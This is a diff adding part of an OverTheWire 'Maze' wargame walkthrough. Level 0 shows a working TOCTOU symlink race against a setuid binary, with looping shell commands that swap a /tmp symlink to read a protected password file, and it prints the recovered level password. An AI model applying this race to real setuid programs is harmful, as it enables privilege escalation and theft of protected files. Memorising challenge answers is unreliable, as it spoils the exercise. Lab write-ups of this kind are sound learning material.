@@ -1340,3 +1340,97 @@ Output:
 
 ```
 **Password: **
+
+# Maze
+
+## Level 0:
+CMD: 
+```bash
+ssh maze0@maze.labs.overthewire.org -p 2225
+```
+Password: 
+```bash
+maze0
+```
+Solution:
+```bash
+strace ./maze0
+```
+
+Output:
+```bash
+access("/tmp/128ecf542a35ac5270a87dc740918404", R_OK) = 0
+geteuid32()                             = 15000
+geteuid32()                             = 15000
+geteuid32()                             = 15000
+setresuid32(15000, 15000, 15000)        = 0
+openat(AT_FDCWD, "/tmp/128ecf542a35ac5270a87dc740918404", O_RDONLY) = 3
+read(3, "root:x:0:0:root:/ro", 19)      = 19
+write(1, "root:x:0:0:root:/ro", 19root:x:0:0:root:/ro)     = 19
+exit_group(0)                           = ?
++++ exited with 0 +++
+```
+
+```bash
+ls /tmp/128ecf542a35ac5270a87dc740918404
+```
+
+Output:
+```bash
+ls: cannot access '/tmp/128ecf542a35ac5270a87dc740918404': No such file or directory
+```
+
+```bash
+ls /etc/maze_pass/
+```
+
+Output:
+```bash
+maze0  maze1  maze2  maze3  maze4  maze5  maze6  maze7  maze8  maze9
+```
+
+Since the file doesnt exist we can create symlink pointing at `/etc/maze_pass/maze1`
+
+Open two terminals
+
+Terminal 1:
+```bash
+while true
+do
+    /maze/maze0
+done
+```
+
+Terminal 2:
+```bash
+while true
+do
+    ln -sf /etc/passwd /tmp/128ecf542a35ac5270a87dc740918404
+    ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
+done
+```
+
+It is TOCTOU (Time-of-Check to Time-of-Use) race case
+
+Output:
+```bash
+oot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/rokfL7RRfpkY root:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/roroot:x:0:0:root:/
+```
+From this we get the password as `kfL7RRfpkY`
+
+**Password: kfL7RRfpkY**
+
+## Level 1:
+CMD: 
+```bash
+ssh maze1@maze.labs.overthewire.org -p 2225
+```
+Password: 
+```bash
+kfL7RRfpkY
+```
+Solution:
+```bash
+```
+
+**Password: **
